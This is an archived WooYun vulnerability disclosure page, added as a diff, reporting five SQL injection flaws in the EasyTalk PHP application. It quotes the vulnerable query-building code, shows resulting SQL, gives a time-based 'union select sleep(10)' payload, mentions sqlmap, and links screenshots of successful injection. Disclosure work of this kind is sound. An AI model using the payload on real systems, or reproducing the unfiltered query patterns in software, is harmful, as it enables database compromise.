@@ -1,0 +1,402 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		EasyTalk Sql Injection 6-10  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		EasyTalk Sql Injection 6-10  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/′  雨。">′  雨。</a> 
+</li><li>提交时间：		2014-02-09 10:30</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-12：	细节向第三方安全合作伙伴开放<br/>
+									2014-02-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-01：	细节向普通白帽子公开<br/>
+									2014-03-21：	细节向实习白帽子公开<br/>
+									2014-05-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">过滤不严。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注入6：<br />
+<br />
+在apiaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function userpreview() {<br />
+        $username=trim(rawurldecode($this-&gt;_post(&#039;username&#039;)));<br />
+        if ($username) {<br />
+            parent::init();<br />
+            $user = M(&#039;Users&#039;)-&gt;where(&quot;user_name=&#039;$username&#039;&quot;)-&gt;find();<br />
+            if ($user) {<br />
+				if ($user[&#039;cityid&#039;]) {//用户所在地<br />
+					$dtModel=M(&#039;District&#039;);<br />
+					$pdata = $dtModel-&gt;where(&quot;id=&#039;$user[cityid]&#039;&quot;)-&gt;find();<br />
+					$pdata2 = $dtModel-&gt;where(&quot;id=&#039;$pdata[upid]&#039;&quot;)-&gt;find();<br />
+					$user[&#039;live_city&#039;]=$pdata2[&#039;name&#039;].&#039; &#039;.$pdata[&#039;name&#039;];<br />
+				}<br />
+                $isfriend=D(&#039;Friend&#039;)-&gt;followstatus($user[&#039;user_id&#039;],$this-&gt;my[&#039;user_id&#039;]);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$username<br />
+<br />
+无过滤 且解码。<br />
+<br />
+<br />
+<br />
+然后带入查询<br />
+<br />
+<br />
+<br />
+$user = M(&#039;Users&#039;)-&gt;where(&quot;user_name=&#039;$username&#039;&quot;)-&gt;find();<br />
+<br />
+<br />
+<br />
+where user_name=&#039;username&#039;<br />
+<br />
+<br />
+<br />
+SELECT * FROM `et_users` WHERE user_name=&#039;admin&#039; LIMIT 1<br />
+<br />
+<br />
+<br />
+执行的语句 构造一下<br />
+<br />
+</p><p class="detail"><a href="../images/061538334c3022d97132b50d9b9edab95fa61070.jpg" target="_blank"><img src="../images/061538334c3022d97132b50d9b9edab95fa61070.jpg" alt="X}U8~O{{FKOY@JC0OY3MEKB.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入成功 有图 有真相。<br />
+<br />
+注入7：<br />
+<br />
+在appaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function myapps() {<br />
+		parent::tologin();<br />
+		import(&quot;@.ORG.Page&quot;);<br />
+        C(&#039;PAGE_NUMBERS&#039;,10);<br />
+		$pvmodel=D(&#039;MyappsView&#039;);<br />
+		$keyword=htmlspecialchars(trim($_REQUEST[&#039;keyword&#039;]));<br />
+		<br />
+		if (!$keyword) {<br />
+			$count=M(&#039;Myapps&#039;)-&gt;where(&quot;user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;&quot;)-&gt;count();<br />
+			$p= new Page($count,20);<br />
+			$page = $p-&gt;show(&quot;?m=app&amp;a=myapps&amp;p=&quot;);<br />
+			$myapp=$pvmodel-&gt;where(&quot;user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;&quot;)-&gt;order(&quot;installs DESC&quot;)-&gt;limit($p-&gt;firstRow.&#039;,&#039;.$p-&gt;listRows)-&gt;select();<br />
+		} else {<br />
+			$count=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;&quot;)-&gt;count();<br />
+			$p= new Page($count,20);<br />
+			$page = $p-&gt;show(&quot;?m=app&amp;a=myapps&amp;keyword=$keyword&amp;p=&quot;);<br />
+			$myapp=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;&quot;)-&gt;order(&quot;installs DESC&quot;)-&gt;limit($p-&gt;firstRow.&#039;,&#039;.$p-&gt;listRows)-&gt;select();<br />
+		}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$keyword=htmlspecialchars(trim($_REQUEST[&#039;keyword&#039;]));<br />
+<br />
+<br />
+<br />
+实体化 对注入影响不大。<br />
+<br />
+<br />
+<br />
+然后带入 <br />
+<br />
+$count=$pvmodel-&gt;where(&quot;name LIKE &#039;%$keyword%&#039; AND user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;&quot;)-&gt;count();<br />
+<br />
+<br />
+<br />
+SELECT COUNT(*) AS tp_count FROM et_myapps Myapps LEFT JOIN et_plugins Plugins ON Myapps.appid=Plugins.id WHERE name LIKE &#039;%yu%&#039; AND user_id=&#039;2&#039; LIMIT 1<br />
+<br />
+<br />
+<br />
+执行的语句 构造一下<br />
+<br />
+</p><p class="detail"><a href="../images/061544538fda385294462825c26a18018a0f1ffa.jpg" target="_blank"><img src="../images/061544538fda385294462825c26a18018a0f1ffa.jpg" alt="%[RU[BANFF82D$~[CZ3~X(R.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入成功 有图有真相。<br />
+<br />
+注入8：<br />
+<br />
+在appmanageraction.class.php 中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function init() {<br />
+		$hookids=$_POST[&#039;hookids&#039;];<br />
+		if ($hookids) {<br />
+			$mid=$_POST[&#039;mid&#039;];<br />
+			$_myapps=M(&#039;Myapps&#039;)-&gt;where(&quot;user_id=&#039;$mid&#039;&quot;)-&gt;select();<br />
+			if ($_myapps) {<br />
+				foreach ($_myapps as $val) {<br />
+					$myapps[$val[&#039;appid&#039;]]=1;<br />
+				}<br />
+			}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$mid=$_POST[&#039;mid&#039;];<br />
+<br />
+where user_id=&#039;$mid&#039;<br />
+<br />
+无过滤。 带入查询 <br />
+<br />
+$_myapps=M(&#039;Myapps&#039;)-&gt;where(&quot;user_id=&#039;$mid&#039;&quot;)-&gt;select();<br />
+<br />
+<br />
+<br />
+看执行的语句。SELECT * FROM `et_myapps` WHERE user_id=&#039;123&#039;<br />
+<br />
+构造一下。<br />
+<br />
+mid=yu&#039; union select sleep(10),2,3,4%23<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06155855dec840edef28c434bfc261054691642b.jpg" target="_blank"><img src="../images/06155855dec840edef28c434bfc261054691642b.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+执行的语句<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06160005cbb7f9b6d1a99b23d51abb4adeb8a7b8.jpg" target="_blank"><img src="../images/06160005cbb7f9b6d1a99b23d51abb4adeb8a7b8.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+成功延时 <br />
+<br />
+注入9：<br />
+<br />
+在commentaction.class.php中<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function delmsg() {<br />
+        $cmid=$_POST[&#039;cmid&#039;];<br />
+        if (is_array($cmid)) {<br />
+            $cids=implode(&#039;,&#039;,$cmid);<br />
+            M(&#039;Comments&#039;)-&gt;where(&quot;comment_id IN ($cids) AND (user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; OR comment_uid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;delete();<br />
+        } else if (is_numeric($cmid)) {<br />
+		M(&#039;Comments&#039;)-&gt;where(&quot;comment_id=&#039;$cmid&#039; AND (user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; OR comment_uid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;delete();<br />
+        }<br />
+        echo json_encode(array(&quot;ret&quot;=&gt;&#039;success&#039;,&quot;tip&quot;=&gt;L(&#039;del_comment_success&#039;)));<br />
+    }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$cmid=$_POST[&#039;cmid&#039;];  无过滤 <br />
+<br />
+<br />
+<br />
+M(&#039;Comments&#039;)-&gt;where(&quot;comment_id IN ($cids) AND (user_id=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039; OR comment_uid=&#039;&quot;.$this-&gt;my[&#039;user_id&#039;].&quot;&#039;)&quot;)-&gt;delete();<br />
+<br />
+<br />
+<br />
+带入<br />
+<br />
+<br />
+<br />
+交给sqlmap把。<br />
+<br />
+</p><p class="detail"><a href="../images/0616151610589df5419a8ddf0e50daa93bcc365b.jpg" target="_blank"><img src="../images/0616151610589df5419a8ddf0e50daa93bcc365b.jpg" alt="6E97S_EA)}KCN%2R_2MZFQR.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注入成功 有图有真相 。<br />
+<br />
+注入10：<br />
+<br />
+在appaction.class.php 中<br />
+<br />
+<br />
+<br />
+    public function index() {<br />
+<br />
+	<br />
+<br />
+		parent::tologin();<br />
+<br />
+        $appname=trim($this-&gt;_get(&#039;appname&#039;));<br />
+<br />
+		$action=$this-&gt;_get(&#039;action&#039;);//直接调用方法<br />
+<br />
+		$app=M(&#039;Plugins&#039;)-&gt;where(&quot;directory=&#039;$appname&#039; AND available=1&quot;)-&gt;find();<br />
+<br />
+		$this-&gt;assign(&#039;app&#039;,$app);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+$appname 无过滤 且直接带入查询。<br />
+<br />
+<br />
+<br />
+where directory=&#039;$appname&#039; 		<br />
+<br />
+</p><p class="detail"><a href="../images/06170743357deccabd1918aa9c850a65a821b530.jpg" target="_blank"><img src="../images/06170743357deccabd1918aa9c850a65a821b530.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+所执行的语句<br />
+<br />
+</p><p class="detail"><a href="../images/061708123dadaf3c631b24b0943906aa815c8da6.jpg" target="_blank"><img src="../images/061708123dadaf3c631b24b0943906aa815c8da6.jpg" alt="2.jpg" width="600"/></a></p><p class="detail">&lt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+成功延时 </p><p class="detail"><a href="../images/06171015aea51bd4bda4bb28a33c0a9cfe9842bf.jpg" target="_blank"><img src="../images/06171015aea51bd4bda4bb28a33c0a9cfe9842bf.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">加强过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/′  雨。" title="′  雨。">′  雨。</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050344" title="EasyTalk Sql Injection 6-10">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2014-02-09 16:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">正在修复中</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50344";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
